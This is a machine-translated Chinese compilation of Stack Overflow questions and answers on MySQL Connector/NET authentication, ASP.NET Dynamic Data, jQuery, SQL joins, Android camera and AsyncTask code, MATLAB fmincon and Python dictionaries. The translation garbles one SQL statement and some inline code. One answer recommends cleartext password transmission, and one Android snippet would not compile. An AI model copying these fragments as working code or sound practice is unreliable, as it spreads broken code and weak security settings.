                try
                {
                    conn.Open();
                    MessageBox.Show("Test Connection Succeded");
                }
                catch (MySqlException ex)
                {
                    MessageBox.Show(ex.Message);
                }
            } 
```

我不明白问题出在哪里。请帮我

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-04-13T15:13:41.243

我有同样的问题。在我的情况下，只需运行以下通过 Workbench 连接到我的数据库的命令：

```
SET SESSION old_passwords=0;
SET PASSWORD FOR my_user=PASSWORD('my_password'); 
```

之后，我可以在 c# 代码中使用 MySql Connector 6.6.5 与通用 mysql 连接字符串进行连接：

```
"server=my_server_ip;user=my_user;database=my_db;port=3306;password=my_password;" 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-09-10T17:59:31.487

今天我在我的 C# 应用程序中遇到了类似的问题。我尝试连接到 hostgator.com (mysql) 上的服务器并连接到 localhost。在阅读了许多帖子并进行了许多更改之后，遵循了每一步，但我无法连接到我的 hostgator mysql。

我的解决方案是将 MySql Connector/NET 库从版本 6.* 更改为版本 5.*。更改后我的应用程序连接成功。

虽然这可能不是对每个人都可行的解决方案，但它可能对某些人有用。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-07-22T21:43:15.093

使用 C# 的 MySqlClient 包时遇到了同样的问题。让我们分解一下：

我们需要数据库不使用旧式密码，因此我们执行

> SET old_passwords=0;

**注意**没有“SESSION”关键字。这是只允许您的第一个查询工作的原因，“SESSION”意味着临时的，并且任何会话设置在会话结束后都会丢失。

接下来我们需要将user@host的密码设置为新的密码样式

> 为用户@主机设置密码=密码（'密码'）；

这两个应该允许你的 MySqlClient

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-12-21T13:19:47.693

我今天遇到了这个问题，但我已将其修复如下：

```
SET old_passwords=FALSE;
SET PASSWORD = PASSWORD('new pwd here'); 
```

那么，可能服务器的连接版本低于客户端，所以你必须运行这个：“SET old_passwords=FALSE;” 祝你好运！

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2018-01-10T10:08:19.547

忘记应用 SET old_password=0 因为如果服务器配置为使用新密码，那么如果您的应用程序不再访问，则没有理由更改服务器上的标志。调查您正在使用的连接器 NET。

连接器 6.5.4 是使用 old_password 的正确版本，最近的版本正在使用新的。

最好的做法是避免在机器上安装连接器，如果您已经拥有 dll，只需让 NET 处理 dll，或者无论如何尝试查找 MySQL.Data.DLL 版本 6.5.4.0 (384 kbytes)

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2015-10-27T17:15:40.263

只是想添加到@diangelisj 答案并说问题的根源是您服务器上安装的 PhpMyAdmin 版本。为了使用最新的 MySQL 数据连接器类，您必须拥有最新的 PhpMyAdmin（或出现问题）。就我而言，我有 PhpMyAdmin 4.0.10.7 并尝试使用 MySQL Data Connector 6.7.9，但它给出了错误。

我做了什么：

1.  [从https://dev.mysql.com/downloads/connector/net/6.9.html](https://dev.mysql.com/downloads/connector/net/6.9.html)下载 5.2.7 版

2.  添加 .dll 作为应用程序的引用

3.  快！

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2014-05-04T10:32:39.173

尽管我尝试了所有提出的建议，但我并没有像其他回应的人那样设法解决问题。最后事实证明，我的数据库所在的服务器自 3.5.5 版以来没有更新 phpMyAdmin，并且目前在 4.1.14 版中到处使用，这是一个问题。解决方案是将您的主机 phpMyAdmin 或您自己的 mySQL 更新回早期版本，以便继续在远程数据库上工作。您可能需要这些知识来解决出现的一些疑问。:)

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2014-01-07T15:41:57.817

我刚刚解决了我的问题，就像这样：

1）使用mysql工作台连接到数据库（选择“use old auth”和“send pass in cleartext”

2）使用工作台，我运行了以下几次（因为它一直说'0行受影响'）：（还将用户ID和密码更改为您的正确内容）

```
SET SESSION old_passwords=0; 
SET PASSWORD FOR userID=PASSWORD('password');

SET SESSION old_passwords=false; 
SET PASSWORD FOR userID=PASSWORD('password'); 
```

3）现在回到你的应用程序，它应该运行......

至少我是这样做的。我正在使用 IX mysql，他们确实在他们的服务器上使用旧的身份验证，所以你必须在你的最后做一些事情......

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2015-08-18T10:07:18.300

今天我发现了同样的问题。我下载了工作台。工作台连接数据库有一些设置，如下： 1.选择选项卡 SSL ，在“**使用 SSL** ”中选择选项'no'。2.选择tab advanced，在Use the ole authentication Protocol中选择。在工作台工作之后。并关注 tai1001 的帖子。这就是我发现所有可行的步骤。

# asp.net - 动态数据安全修整

> ID：15772480
> 
> 赞同：0
> 
> 时间：2013-04-02T19:17:20.837
> 
> 标签：asp.net, asp.net-dynamic-data

使用动态数据时，有一种方法只允许用户查看包含其姓名/ID # 的记录。这意味着当他们过滤数据时，只会显示他们的信息，而不是每个用户。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-04T20:49:23.703

至于在动态数据中实现安全性，我想向您推荐一本Oleg Sych所著的**ASP.NET Dynamic Data Unleashed的好书。**

至于您的情况，据我了解，您需要在*List.aspx页面上的***GridView**中仅显示包含当前登录用户的 ID 或名称的记录。

 *让我们考虑使用动态数据方法解决问题的最简单方法。

让我们假设，在不考虑用户如何访问您的动态数据站点的情况下，我们在*List.aspx*的代码中获得了用户**ID**。为简单起见，假设我们的表包含用户**ID**。

 *****List.aspx.cs**（部分）

```
public partial class List : System.Web.UI.Page
{
    protected int userId;

    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            userId = GetLoggedUser();  
        }        
    }
} 
```

然后我们应该使用特殊的非可视控件**QueryExtender**并使用 TargetControlID 属性将它与我们基于 LINQ 的数据源控件相关联（假设在这种情况下我们有 EntityDataSource）。

**List.aspx**（部分）

```
<asp:GridView 
    ID="gvTest" 
    runat="server" 
    DataSourceID="DetailsDataSourceTest"
    AllowPaging="true" 
    AllowSorting="false" 
    PageSize="10" 
    CssClass="gridview" 
    AutoGenerateColumns="false">
<Columns>
    <asp:DynamicField DataField="UserId" />
    <asp:DynamicField DataField="Col1" />
    <asp:DynamicField DataField="Col2" />
    <asp:DynamicField DataField="Col3" />
</Columns>
</asp:GridView>
<asp:EntityDataSource 
    ID="DetailsDataSourceTest" 
    runat="server"
    ConnectionString="name=TestEntities" 
    DefaultContainerName="TestEntities"
    EnableFlattening="false"
    EntitySetName="TableTestName" />
<asp:QueryExtender 
    ID="QueryExtenderTest" 
    runat="server"
    TargetControlID="DetailsDataSourceTest">
<asp:CustomExpression OnQuerying="QueryExtenderTest_Querying" />
</asp:QueryExtender> 
```

如您所见，我们使用**QueryExtender控件的****CustomExpression**选项，然后我们将其**OnQuerying**属性设置为**QueryExtenderTest_Querying**。这将允许我们执行我们的**自定义**LINQ 查询。

 ********List.aspx.cs**（部分）

```
protected void QueryExtenderTest_Querying(object sender, System.Web.UI.WebControls.Expressions.CustomExpressionEventArgs e)
{
    if (/* check userId if you would like */)
    {
        e.Query = (from c in e.Query.Cast<TableTestName>()
                    where (c.UserId == userId)
                    select c);
    }
} 
```

了解更多信息：

[演练：使用声明性语法过滤网页中的数据](http://msdn.microsoft.com/en-us/library/dd537669.aspx)

**编辑：**

基于它简单的解决方案并根据在动态数据站点中实现路由，您应该在 Details.aspx 页面和 Edit.aspx 页面上使用自定义 LINQ，以便用户无法通过查询字符串访问不属于自己的记录。**********

# jquery - 如何通过 jQuery 将表单输入字段附加到主字段？

> ID：15772482
> 
> 赞同：0
> 
> 时间：2013-04-02T19:17:22.247
> 
> 标签：jquery, forms, input, append

我正在尝试根据其他表单字段值自动填充表单字段。

例如，如果我要求输入三个名称，我希望根据这三个名称填充另一个字段 (#MyInput)。

```
name 1 <input type="type" value="" class="names" /><br />
name 2 <input type="type" value="" class="names" /><br />
name 3 <input type="type" value="" class="names" /><br />
list <input type="text" id="MyInput" /><br /> 
```

脚本：

```
$('.names').keyup(function() {
var myInput = $('#MyInput').val('')[0];

$('.names').val().each(function(){
 myInput.value += this.value + ' ';

});
}).keyup(); 
```

小提琴：http: [//jsfiddle.net/SQcGq/21/](http://jsfiddle.net/SQcGq/21/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T19:21:13.120

```
$('.names').val().each(function(){
 myInput.value += this.value + ' ';

});
}).keyup(); 
```

应该

```
$('.names').each(function(){
 myInput.value += this.value + ' ';

});
}).keyup(); 
```

[http://jsfiddle.net/SQcGq/22/](http://jsfiddle.net/SQcGq/22/)

# mysql - 根据条件加入 MySQL 表？

> ID：15772483
> 
> 赞同：1
> 
> 时间：2013-04-02T19:17:23.757
> 
> 标签：mysql, join, conditional-statements

**问题：**

我试图弄清楚如何根据 SQL 语句中的条件连接表。我花了一个小时搜索 Google、SO、各种网站和 MYSQL 手册，但我就是找不到我想做的正确语法。

我无法发布我正在尝试使用的确切查询，但为了简单起见，我将发布一个简化版本。

**设想：**

假设我有三个表，`a`= 人表，`b`= 地址表和`c`= 车表。

Table`b`将始终连接到 table `a`，因为一个人总是住在一个地址，但只有当“car_id”字段中的值大于 0`c`时才应该连接到table，因为有车是可选的。`a`

**查询：**

```
SELECT a.firstname, a.lastname, a.gender, a.address_id, b.address_firstline,  b_address_secondline, b.postcode, c.car_manufacturer, c.car_model 
FROM a 
INNER JOIN b ON b.id = a.address_id 
INNER JOIN c ON c.id = a.car_id AND a.car_id > 0 
WHERE a.id = 1 
```

上面的查询对于 id 为 1 的人来说运行良好，因为他拥有汽车。但是，如果为 id 为 2 的人运行查询，则查询将返回 0 行，因为她没有汽车。

如何使第二个 JOIN 成为可选？我试过使用 IF ELSE 语句，但我总是遇到语法错误。有人可以在这里指出我正确的方向吗？提前致谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T19:21:06.177

您应该使用左外连接将 c 与 a 连接起来。

```
SELECT a.firstname, a.lastname, a.gender, a.address_id, b.address_firstline,  b_address_secondline, b.postcode, c.car_manufacturer, c.car_model 
FROM a 
INNER JOIN b ON b.id = a.address_id 
LEFT OUTER JOIN c ON c.id = a.car_id AND a.car_id > 0 
WHERE a.id = 1 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-02T19:26:45.940

使用`LEFT JOIN`而不是`INNER JOIN`放在桌子上`c`。

*单边*连接适用于这种情况。

**简要说明。**

*   `a INNER JOIN b ON a.field1 = b.field1`返回两者`a.field1`和`b.field1`存在且相等的每一行
*   `a LEFT JOIN b ON a.field1 = b.field1`返回 table 中的每一行，`a`并返回 table 中的每一行，以及table`b`上不匹配值的值。`a.field1 = b.field1``null``b`
*   `RIGHT JOIN`类似于`LEFT JOIN`

# android - Android 相机活动保持打开状态

> ID：15772487
> 
> 赞同：0
> 
> 时间：2013-04-02T19:17:33.813
> 
> 标签：android, android-camera

我正在尝试使用我的 Android 应用程序拍照，但是当我拍照时，相机显示并没有消失。我正在使用的代码如下。我还在 Google 的开发者网站 SDK 上使用了 SDK。

```
 import android.os.Bundle;
 import android.app.Activity;
 import android.content.Intent;
 import android.graphics.Bitmap;
 import android.graphics.Camera;
 import android.view.Menu;
 import android.view.MotionEvent;
 import android.view.View;
 import android.widget.Button;
 import android.widget.ImageView;

 public class MainActivity extends Activity {
private static final int CAMERA_REQUEST = 1888; 

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    Button mainButton = (Button)findViewById(R.id.mainBtn);
    mainButton.setOnTouchListener(new View.OnTouchListener() {

        @Override
        public boolean onTouch(View v, MotionEvent event) {
            // TODO Auto-generated method stub
            //Intent userCreationIntent = new Intent(v.getContext(), SecondviewActivity.class);
            //startActivity(userCreationIntent);
            Intent cameraIntent = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE); 
            startActivityForResult(cameraIntent, CAMERA_REQUEST); 

            return false;
        }
    });
}

protected void onActivityResult(int requestCode, int resultCode, Intent data) {  
    if (requestCode == CAMERA_REQUEST) {  
        Bitmap photo = (Bitmap) data.getExtras().get("data");
        ImageView imageView = (ImageView)findViewById(R.id.imageView1);
        imageView.setImageBitmap(photo);
        Intent cameraIntent = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
    }  
} 

@Override
public boolean onCreateOptionsMenu(Menu menu) {
    // Inflate the menu; this adds items to the action bar if it is present.
    getMenuInflater().inflate(R.menu.activity_main, menu);
    return true;
}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-04T19:48:30.863

发生这种情况是因为您没有附加路径，目的是告诉 Android 将图像存储在哪里。我也有同样的问题。

试试下面的代码：（我刚刚添加了 4 行）

```
import android.os.Bundle;
import android.app.Activity;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Camera;
import android.view.Menu;
import android.view.MotionEvent;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;

public class MainActivity extends Activity {
    private static final int CAMERA_REQUEST = 1888; 
    // Creating the Uri where Camera saves a picture each time
    String imagePath = Environment.getExternalStorageDirectory().getAbsolutePath() + "/" + System.currentTimeMillis() + "_myCameraImage.jpg";
    File imageFile = new File(imagePath);
    imageUri = Uri.fromFile(imageFile);

@Override
protected void onCreate(Bundle savedInstanceState) {
   super.onCreate(savedInstanceState);
   setContentView(R.layout.activity_main);

   Button mainButton = (Button)findViewById(R.id.mainBtn);
   mainButton.setOnTouchListener(new View.OnTouchListener() {

   @Override
   public boolean onTouch(View v, MotionEvent event) {
        // TODO Auto-generated method stub
        //Intent userCreationIntent = new Intent(v.getContext(), SecondviewActivity.class);
        //startActivity(userCreationIntent);

        Intent cameraIntent = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE); 
        cameraIntent.putExtra(android.provider.MediaStore.EXTRA_OUTPUT, imageUri);

        startActivityForResult(cameraIntent, CAMERA_REQUEST); 

        return false;
        }
    });
}

protected void onActivityResult(int requestCode, int resultCode, Intent data) {  
    if (requestCode == CAMERA_REQUEST) {  
        Bitmap photo = (Bitmap) data.getExtras().get("data");
        ImageView imageView = (ImageView)findViewById(R.id.imageView1);
        imageView.setImageBitmap(photo);
        Intent cameraIntent = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
    }  
} 

@Override
public boolean onCreateOptionsMenu(Menu menu) {
    // Inflate the menu; this adds items to the action bar if it is present.
    getMenuInflater().inflate(R.menu.activity_main, menu);
    return true;
   }
} 
```

在复制和粘贴此代码之前，请确保您的代码中有必要的导入语句，例如 File、Uri 等的导入语句。

我强烈希望它现在可以工作:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-04T20:23:38.097

问题是在你`onTouchListener`的`Button`！

我刚刚运行了您的代码并将其更改为`onTouchListener`a并且代码正在运行。`onClickListener``Button`

在这里查看我修改后的代码：

```
import android.app.Activity;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.ImageView;

public class MainActivity extends Activity {
    private static final int CAMERA_REQUEST = 1888;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button mainButton = (Button) findViewById(R.id.mainBtn);
        mainButton.setOnClickListener(new OnClickListener() {       
            @Override
            public void onClick(View arg0) {
                Intent cameraIntent = new Intent(
                android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
                startActivityForResult(cameraIntent, CAMERA_REQUEST);
            }
        });
    }

    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == CAMERA_REQUEST) {
            Bitmap photo = (Bitmap) data.getExtras().get("data");
            ImageView imageView = (ImageView) findViewById(R.id.imageView1);
            imageView.setImageBitmap(photo);
        }
    }
} 
```

我不太确定，为什么你使用`onTouchListener`for a `Button`，但它显然不起作用 - 实际上真的很奇怪;-)

编辑：只是一个小更新。我尝试调试代码，如果您使用`onTouchListener`代替`onClickListener`，单击按钮时，您实际上会触发3 `MotionEvents`:`MotionEvent.ACTION_DOWN`和.`MotionEvent.ACTION_MOVE``MotionEvent.ACTION_UP`

现在第一个事件`MotionEvent.ACTION_DOWN`将触发您显示相机的意图，当您在拍照后单击“确定”时，下一个`MotionEvent` `MotionEvent.ACTION_MOVE`事件正在排队等待触发，这将再次将您发送到相机活动。现在，在再拍一张照片并单击“确定”后，您返回到您的活动，现在最后一张`MotionEvent` `MotionEvent.ACTION_UP`正在排队等候并触发对相机活动的第三次调用。在最后一次摄像头通话后，您将能够毫无问题地回到您的活动中；-)

为什么`onClickListener`不这样做，是因为它处理可能是的“完整”点击， `MotionEvent.ACTION_DOWN`因此`MotionEvent.ACTION_MOVE`所有`MotionEvent.ACTION_UP`3 个事件都在一次点击中发生。

希望这可以帮助 ;-）

# android - onClick 执行 AsyncTask 时应用程序崩溃

> ID：15772489
> 
> 赞同：0
> 
> 时间：2013-04-02T19:17:38.117
> 
> 标签：android, crash, onclick, android-asynctask

我在尝试使用按钮 onClick 事件运行 AsyncTask 时遇到问题。我让它在“HomePageActivity”中工作，但随后将代码转移到一个新的活动中，现在应用程序在单击按钮时崩溃。它曾经完美地工作。

谁能帮我解决这个问题？我敢肯定，这很简单，一双新的眼睛可以发现。

```
public class GamesOverview extends HomePageActivity {

public final static String BaseUrl="http://URL.com/"; 
 ArrayList<DEPT_HOLD> deptList=new ArrayList<DEPT_HOLD>();

private class GetDeptAyncTask extends AsyncTask<Hashtable<String,String>,Void,String>{  
 // Parse in background
 @Override
 protected String doInBackground(Hashtable<String,String>... params) {
  @SuppressWarnings("rawtypes")
  Hashtable ht=params[0];
  @SuppressWarnings("unchecked")
  String json=HelperHttp.getJSONResponseFromURL(BaseUrl+"JSONURLGOESHERE", ht);
   if(json!=null) parseJsonString(deptList,json);
   else {
    return "Invalid Company Id";
   }
    return "SUCCESS";
 }
 // Parse JSON
 protected void parseJsonString(ArrayList<DEPT_HOLD> deptList,String json) {
  try {
   JSONObject top = new JSONObject(json);
   JSONObject topAdds = (JSONObject) top.get("topAdds");
   JSONArray array = (JSONArray) topAdds.get("player");
    for(int i = 0; i < array.length(); i++) {
     JSONObject j = array.getJSONObject(i);
     DEPT_HOLD d = new DEPT_HOLD();
      d.one = j.optString("percent","");
      d.two = j.optString("id","");
       deptList.add(d);
    }
  } catch (JSONException e) {
   e.printStackTrace();
  }
 } 
 // Execute post
 @Override
 protected void onPostExecute(String result) {
  if(result=="SUCCESS") {
   Toast.makeText(GamesOverview.this, "Success"+deptList, Toast.LENGTH_SHORT).show();
   DeptArrayAdapter adapter=new DeptArrayAdapter(GamesOverview.this,R.id.text1,deptList);
   ListView listv=(ListView)findViewById(R.id.lv);
   listv.setAdapter(adapter);
  }
  else{}
 }    
}

public void onCreate(Bundle savedInstanceState) {
 super.onCreate(savedInstanceState);

  // Scrolling
  ScrollView scroll;
  scroll = new ScrollView(this);
   HorizontalScrollView horizontalscroll;
   horizontalscroll = new HorizontalScrollView(this);
  // End

    // Get JSON button
    final Button JSONButton = new Button(this);
     JSONButton.setText("Get JSON");
     JSONButton.setTextSize(20);
     JSONButton.setTextColor(Color.rgb(000,000,000));
      JSONButton.setOnClickListener(new View.OnClickListener() {
       @Override
       public void onClick(View v) {
        executeAsyncTask();
       }
      });
    // End

    // LAYOUT
    LinearLayout layout = new LinearLayout(this);
     layout.setOrientation(LinearLayout.VERTICAL);
     layout.setLayoutParams(new LayoutParams(LayoutParams.FILL_PARENT,LayoutParams.WRAP_CONTENT));
     LinearLayout.LayoutParams layoutparams = new LinearLayout.LayoutParams(getWindowManager().getDefaultDisplay().getWidth(),getWindowManager().getDefaultDisplay().getHeight());
      layout.setGravity(Gravity.CENTER_HORIZONTAL);
       layout.setBackgroundResource(R.drawable.body_bg);
        // DisplayJSONButton
        LinearLayout displayJSONButtonlayout = new LinearLayout(this);
         displayJSONButtonlayout.setOrientation(LinearLayout.HORIZONTAL);
         displayJSONButtonlayout.setLayoutParams(new LayoutParams(LayoutParams.FILL_PARENT,LayoutParams.WRAP_CONTENT));
         LinearLayout.LayoutParams displayJSONButtonlayout_params = new LinearLayout.LayoutParams(getWindowManager().getDefaultDisplay().getWidth()-50,100);
          displayJSONButtonlayout_params.setMargins(0,10,0,0);
          displayJSONButtonlayout.setGravity(Gravity.CENTER_HORIZONTAL);
           displayJSONButtonlayout.addView(JSONButton,displayJSONButtonlayout_params);
    // END LAYOUT       

     layout.addView(displayJSONButtonlayout);
      layout.requestLayout();

      // Enable scrolling
      scroll.addView(layout,layoutparams);
      horizontalscroll.addView(scroll);

       // Set content view
       setContentView(horizontalscroll);

}

// Finish up task
@SuppressWarnings("unchecked")
private void executeAsyncTask(){
 Hashtable<String,String> ht=new Hashtable<String,String>();
 GetDeptAyncTask async=new GetDeptAyncTask();
  ht.put("", "");
   @SuppressWarnings("rawtypes")
   Hashtable[] ht_array={ht};
    async.execute(ht_array);
}

} 
```

我能找到的所有 logcat 信息：

```
?:??: W/?(?): URL==>http://football.myfantasyleague.com/2007/export?TYPE=topAdds&W=12&JSON=1?=
?:??: W/?(?): Forward DNS query to netd(h=football.myfantasyleague.com s=^)
?:??: W/?(?):   at myfantasyleague.app.GamesOverview$GetDeptAyncTask.onPostExecute(GamesOverview.java:73)
?:??: W/?(?):   at myfantasyleague.app.GamesOverview$GetDeptAyncTask.onPostExecute(GamesOverview.java:1)
?:??: W/?(?):   Force finishing activity myfantasyleague.app/.GamesOverview
?:??: W/?(?): read: 04-02 14:42:47.990   464   474 W ActivityManager:   Force finishing activity myfantasyleague.app/.GamesOverview
?:??: W/?(?): app: myfantasyleague.app
?:??: W/?(?): Activity pause timeout for ActivityRecord{41881918 myfantasyleague.app/.GamesOverview}
?:??: W/?(?): read: 04-02 14:42:48.521   464   477 W ActivityManager: Activity pause timeout for ActivityRecord{41881918 myfantasyleague.app/.GamesOverview}
?:??: W/?(?): ACTION_PACKAGE_REMOVED: myfantasyleague.app
?:??: W/?(?):   dummy: {}]
?:??: W/?(?): 卸载了:myfantasyleague.app
?:??: W/?(?): myfantasyleague.app
?:??: W/?(?): PackageMonitor: doOnReceive(): android.intent.action.PACKAGE_REMOVED [myfantasyleague.app] REPLACING:true
?:??: W/?(?):   dummy: {}]
?:??: W/?(?): PackageMonitor: doOnReceive(): android.intent.action.PACKAGE_REMOVED [myfantasyleague.app] REPLACING:true
?:??: W/?(?): PackageMonitor: doOnReceive(): android.intent.action.PACKAGE_ADDED [myfantasyleague.app] REPLACING:true
?:??: W/?(?): Activity idle timeout for ActivityRecord{4184f330 myfantasyleague.app/.MyFantasyLeagueActivity}
?:??: W/?(?): PackageMonitor: doOnReceive(): android.intent.action.PACKAGE_ADDED [myfantasyleague.app] REPLACING:true
?:??: W/?(?): read: 04-02 14:42:58.560   464   477 W ActivityManager: Activity idle timeout for ActivityRecord{4184f330 myfantasyleague.app/.MyFantasyLeagueActivity}
?:??: W/?(?):   dummy: {}]
?:??: W/?(?): Activity pause timeout for ActivityRecord{4184f330 myfantasyleague.app/.MyFantasyLeagueActivity}
?:??: W/?(?): read: 04-02 14:43:48.631   464   477 W ActivityManager: Activity pause timeout for ActivityRecord{4184f330 myfantasyleague.app/.MyFantasyLeagueActivity}
?:??: W/?(?):   dummy: {}]
?:??: W/?(?): Activity destroy timeout for ActivityRecord{41881918 myfantasyleague.app/.GamesOverview}
?:??: W/?(?): Activity stop timeout for ActivityRecord{4184f330 myfantasyleague.app/.MyFantasyLeagueActivity}
?:??: W/?(?): read: 04-02 14:43:58.857   464   477 W ActivityManager: Activity destroy timeout for ActivityRecord{41881918 myfantasyleague.app/.GamesOverview}
?:??: W/?(?): read: 04-02 14:43:58.857   464   477 W ActivityManager: Activity stop timeout for ActivityRecord{4184f330 myfantasyleague.app/.MyFantasyLeagueActivity}
?:??: W/?(?): This window was lost: Window{425b0c78 myfantasyleague.app/myfantasyleague.app.GamesOverview paused=false}
?:??: W/?(?): mToken=AppWindowToken{424bb208 token=Token{425d1e10 ActivityRecord{41881918 myfantasyleague.app/.GamesOverview}}}
?:??: W/?(?): mRootToken=AppWindowToken{424bb208 token=Token{425d1e10 ActivityRecord{41881918 myfantasyleague.app/.GamesOverview}}}
?:??: W/?(?): mAppToken=AppWindowToken{424bb208 token=Token{425d1e10 ActivityRecord{41881918 myfantasyleague.app/.GamesOverview}}}
?:??: W/?(?): mSurface=Surface(name=myfantasyleague.app/myfantasyleague.app.GamesOverview, identity=7073)
?:??: W/?(?):   #16: Token{421d65e8 ActivityRecord{4184f330 myfantasyleague.app/.MyFantasyLeagueActivity}}
?:??: W/?(?):   #4: Window{42513558 myfantasyleague.app/myfantasyleague.app.MyFantasyLeagueActivity paused=false}
?:??: W/?(?):   dummy: {}]
?:??: W/?(?):   dummy: {}]
?:??: W/?(?):   dummy: {}]
?:??: W/?(?): Activity idle timeout for ActivityRecord{4184f330 myfantasyleague.app/.MyFantasyLeagueActivity}
?:??: W/?(?): read: 04-02 14:44:09.037   464   477 W ActivityManager: Activity idle timeout for ActivityRecord{4184f330 myfantasyleague.app/.MyFantasyLeagueActivity}
?:??: W/?(?): WIN DEATH: Window{42513558 myfantasyleague.app/myfantasyleague.app.MyFantasyLeagueActivity paused=false}
?:??: W/?(?): Process myfantasyleague.app (pid 14733) has died.
?:??: W/?(?): read: 04-02 14:44:40.935   464   866 I ActivityManager: Process myfantasyleague.app (pid 14733) has died.
?:??: W/?(?): Force removing ActivityRecord{4184f330 myfantasyleague.app/.MyFantasyLeagueActivity}: app died, no saved state
?:??: W/?(?): WIN DEATH: Window{425b0c78 myfantasyleague.app/myfantasyleague.app.GamesOverview paused=false}
?:??: W/?(?): read: 04-02 14:44:40.935   464   866 W ActivityManager: Force removing ActivityRecord{4184f330 myfantasyleague.app/.MyFantasyLeagueActivity}: app died, no saved state
?:??: W/?(?):   dummy: {}] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-03T02:35:06.320

根据您的 logcat 它在 onpostexecute() 之前是完美的，我认为您正在等待从以下 url 获得一些结果，这会导致延迟并完成您的活动。

[http://football.myfantasyleague.com/2007/export?TYPE=topAdds&W=12&JSON=1?=](http://football.myfantasyleague.com/2007/export?TYPE=topAdds&W=12&JSON=1?=)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T20:34:20.910

我解决了这个问题。该应用程序崩溃了，因为我编写了要使用 main.xml 布局显示的代码，但一直在尝试使用第二个界面来控制 main.xml 界面。这导致了助手活动的复杂性。

感谢所有试图帮助我解决这个问题的人。

# matlab - 实现调用另一个函数的 fmincon

> ID：15772496
> 
> 赞同：1
> 
> 时间：2013-04-02T19:17:58.790
> 
> 标签：matlab, optimization, minimize

现在，我有一个代码来模拟一个变压器厂（我们称之为 TP1），它给出两个输出“x”和“y”，给定两个物理尺寸“a”和“b”在一个变比范围内。

有几种不同的方法来配置该工厂，因此在工厂模型中有简单的选择标准，可以选择一个设置而不是其他设置，以便最大化输入和输出。（所以我不知道方程式“a”和“b”将通过什么来产生“x”或“y”）

还有另一个变压器 (TP2) 仅针对一个物理尺寸“c”产生输出“x2”和“y2”

以下是我正在尝试做的优化：

目标：给定已建立的 TP2，设计 TP1 使其最小化 a+b 而 x >= x2 和 y>=y2 对于给定的变换比范围。

我不知道如何实现 fmincon（或任何其他优化方法）来完成这项任务，特别是因为我的模型 TP1 非常基于数值。（在数值解决之前，我不知道 config1 或 2 是否更适合某些转换比）我提前感谢您的建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-04T09:15:05.347

`fmincon`是正确的工具：

*   你的未知数是一个二元向量`[a; b]`
*   `X0`您需要提供一个起点猜测`[a; b]`
*   您的成本函数`FUN`只是一个返回的函数`a+b`
*   您有两个非线性约束，需要为`NONLCON`

您的`NONLCON`功能应该：

*   接受二元向量 [a; b] 作为输入
*   评估您的模型，TP1
*   返回`C`（第一个返回值）一个 2 元素向量 [x-x2; y-y2]
*   为第二个返回值返回空`Ceq`

您可能还想为`[a; b]`向量指定上限和下限。

# python - 如何访问元组字典的特定元素

> ID：15772497
> 
> 赞同：5
> 
> 时间：2013-04-02T19:18:03.817
> 
> 标签：python, dictionary, tuples

我想访问元组字典中元组的特定元素。假设我有一个具有唯一键的字典和一个具有三个值的元组，每个键。我想为字典中的每个元素编写一个迭代器，在元组中每隔第三个项目打印一次。

例如

```
dict = {"abc":(1,2,3), "bcd":(2,3,4), "cde", (3,4,5)}

for item in dict:
    print item[2] 
```

但这会返回

```
c
d
e 
```

我哪里错了？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-02T19:18:54.793

```
for item in dict:
    print dict[item][2] 
```

此外，你不应该在内置之后命名任何东西，所以命名你的字典`'d'`或其他东西`'dict'`

`for item in dict:`做同样的事情`for item in dict.keys()`。

或者，您可以执行以下操作：

```
for item in dict.values():
    print item[2] 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-02T19:25:51.710

您的代码很接近，但您必须键入字典，然后打印索引 2 中的值。

您正在打印密钥的一部分。您想要打印与这些键关联的部分值：

```
for item in dict:
   print dict[item][2] 
```

# python - 如何使新行命令在从互联网打开的 .txt 文件中工作？

> ID：15772498
> 
> 赞同：3
> 
> 时间：2013-04-02T19:18:05.570
> 
> 标签：python, replace, runtime-error

我刚开始使用 Python，我正在尝试制作一个程序，它可以在从互联网“www....../lyrics.txt”打开的屏幕上写入一首歌曲的歌词。我的第一个代码：

```
 import urllib.request
    lyrics=urllib.request.urlopen("http://hereIsMyUrl/lyrics.txt")
    text=lyrics.read()
    print(text) 
```

当我激活此代码时，它没有给我网站上写的歌词，它在所有应该是新行的地方给了我换行命令 '\r\n' 并给了我所有歌词在一个长长的凌乱的字符串中。例如：这里的一些歌词\r\n这应该已经是下一行\r\n等等。

我在互联网上搜索代码以用新行替换 '\r\n' 命令并尝试以下操作：

```
 import urllib.request
